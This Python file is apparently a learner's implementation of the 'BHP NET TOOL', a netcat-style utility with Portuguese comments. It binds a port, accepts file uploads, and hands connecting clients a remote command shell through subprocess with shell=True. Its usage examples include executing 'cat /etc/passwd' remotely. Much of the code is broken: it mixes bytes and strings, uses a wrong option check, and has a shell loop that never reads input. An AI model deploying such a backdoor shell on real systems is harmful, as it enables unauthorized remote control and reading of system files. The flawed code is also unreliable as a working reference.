import sys
import socket
import getopt
import threading
import subprocess


# some Globals Variables

listen: bool = False
command: bool = False
upload: bool = False
execute: str = ""
target: str = ""
upload_destination = '/tmp'
port: int


def usage():

    print("BHP NET TOOL"
          "\nUsage: bhp.py -t target_host -p port"
          "\n-l --listen \n:: Executar em [host]:[port] para conexoes de entrada"
          "\n-e --execute=file_to_run \n:: Receber arquivo fornecido em cima receber uma ligacao"
          "\n-c --comand \n:: Inicializa um Comando shell"
          "\n-u --upload=destination \n:: Ao receber conexao carregar um arquivo e gravar em [destination]"
          "\nEx:\n:: ~$bhp.py -t 192.168.0.1 -p 5555 -l -c"
          "\n\n~$bhp.py -t 192.168.0.1 -p 5555 -l -u=[path_to_saved]"
          "\n\n~$bhp.py -t 192.168.0.1 -p 5555 -l -e='cat /etc/passwd'"
          "\n\n~$echo 'AAAABBBCCCDDDEEEFFF' | ./bhp.py -t 192.168.0.1 -p 135"
          )
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()
    # Ler as Opcoes da linha de comando

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"]
                                   )

    except getopt.GetoptError as err:
        print(str(err))
        usage()
    else:
        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
            elif o in ("-l", "--listen"):
                listen = True
            elif o in ("-e", "--execute"):
                execute = a
            elif o in ("-c", "--comandshell"):
                command = True
            elif o.encode() in ("-u", "--upload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                target = a
            elif o in ("-p", "--port"):
                port = int(a)
            else:
                assert False, "Invalid Option"

    if not listen and len(target) and port > 0:

        # Lido do Bufer a partir da linha de comando acima
        # Para bloquear, entao enviar CTRL + D, se nao enviar entrada >>
        # Para stdin:
        buffer = sys.stdin.read()
        client_sender(buffer)

        # Vamos Ouvir e Potencialmente:
        # Alguns uploads, executar comandos, soltar um shell de volta
        # Dependendo de nossas opcoes de linha de comando acima

    if listen:
        server_loop()


# Send Client

def client_sender(buffer):

    """
    :param buffer: Comandos de entrada por parametros
    :return: non
    """
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(10)

    try:
        # Conectando para host de destino
        with client_socket:
            client_socket.connect((target, port))

            if len(buffer):
                client_socket.sendall(buffer.encode())

            while True:
                # Esperar retorno de dados
                response = b""

                while True:
                    data = client_socket.recv(4096)

                    if not data:
                        break
                    response += data

                print(response,)
                # Esperar por alguma entrada

                buffer = input("Enter command: ")
                buffer += "\n"

                # Enviar
                client_socket.sendall(buffer)

    except socket.timeout:
        print("Error: Connection Time out")
    except ConnectionRefusedError:
        print("Error: Connection Refused")
    except ConnectionResetError:
        print("Error: Connection Reseted")
    except OSError as err:
        print(f"Error: {type(err)}")
    except KeyboardInterrupt:
        print("Exiting...")
    finally:
        client_socket.close()



# Primary Server Loop


def server_loop():
    global target, port

    try:
        # Se nenhum trajeto for definido, sera listada diversas interdaces
        if not len(target):
            target = socket.gethostbyname('localhost')

        # Start TCP server with socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Configurar para reutilizar a host e a porta
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        server.bind((target, port))

        # Await Definitions
        server.listen(5)
        print(f"[*] - Listening on {target}:{port}")

        while True:
            client_socket, addr = server.accept()
            print(f"[*] - Accepted connection from {addr[0]}:{addr[1]}")

            # Visao de uma nova threading para nosso client
            client_thread = threading.Thread(target=client_handler, args=(client_socket,))
            client_thread.start()

    except Exception as err:
        print(f"Error : {err}")

    finally:
        server.close()


def run_command(command):
    command = command.rstrip()

    # Executar o comando e retornar uma saida
    try:
        output = subprocess.check_output(command,
                                         stderr=subprocess.STDOUT,
                                         shell=True)

    except:
        output = "Failed the execution command line\r\n"

    # Enviar a Saida de volta para o cliente
    return output.encode()


# Upload de arquivos, execucao de comandos e o shell

def client_handler(client_socket):

    global upload_destination
    global execute
    global command

    # Checando para Carregamento
    if len(upload_destination):
        # Lidos em todos os bytes e mandamos para nosso arquivo
        file_buffer = ""
        max_file_size = 1024 * 1024 # 1MB
        # Manter a leitura ate que nao esteja mais disponivel

        while True:
            data = client_socket.recv(1024)

            if not data:
                break

            file_buffer += data

            if len(file_buffer) > max_file_size:
                client_socket.sendall(b"O tamanho do arquivo excede o tamanho esperado")

            # Agora tomamos os bytes e tentamos escrever no arquivo de carregamento
            try:
                with open(f'{upload_destination}.txt', "wb") as arq:
                    arq.write(file_buffer.encode())
                    client_socket.sendall(f"Arquivo Salvo com Sucesso em {upload_destination}".encode())

            except Exception:
                client_socket.sendall(f"Falha ao salvar arquivo em {upload_destination}".encode())

            # Checando Comando Para execucao
            if execute:
                # Executando comando

                try:
                    output = subprocess.run(
                        execute.split(),
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        check=True).stdout
                    client_socket.send(output.decode())

                except subprocess.CalledProcessError as err:
                    print(f"Erro ao executar o comando {err.output}".encode())

            # Agora vamos para outro ciclo se um comando shell for chamado
            elif command:

                while True:
                    # Mostrar uma linha simples
                    client_socket.send(b"BHP.># ")

                    # Agora recebemos ate que haja um avanco na linha (tecla enter)
                    cmd_buffer = ""

                    while "\n" not in cmd_buffer:

                        # Alguma saida do comando
                        command = run_command(cmd_buffer)
                        # Alguma resposta de saida
                        client_socket.send(command)


main()
